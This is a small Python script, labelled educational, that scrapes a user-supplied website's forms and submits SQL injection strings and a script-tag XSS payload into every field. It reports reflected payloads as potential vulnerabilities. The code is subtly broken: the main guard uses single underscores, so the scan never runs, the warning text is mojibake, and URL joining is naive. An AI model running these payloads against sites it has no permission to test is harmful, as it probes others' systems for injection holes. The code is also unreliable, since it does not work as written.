import requests
from bs4 import BeautifulSoup

# Basic payloads (educational)
SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1 --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>"]

def scan_website(url):
    print(f"\nScanning website: {url}")

    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")

        forms = soup.find_all("form")
        print(f"Found {len(forms)} form(s).")

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")

            for payload in SQL_PAYLOADS + XSS_PAYLOADS:
                data = {}
                for input_tag in inputs:
                    name = input_tag.get("name")
                    if name:
                        data[name] = payload

                target_url = url if action is None else url + action

                if method == "post":
                    r = requests.post(target_url, data=data)
                else:
                    r = requests.get(target_url, params=data)

                if payload.lower() in r.text.lower():
                    print("âš  Potential vulnerability detected!")
                    print("Payload:", payload)
                    print("Form action:", target_url)

    except Exception as e:
        print("Error while scanning:", e)


if _name_ == "_main_":
    website = input("Enter website URL (test/demo only): ")
    scan_website(website)
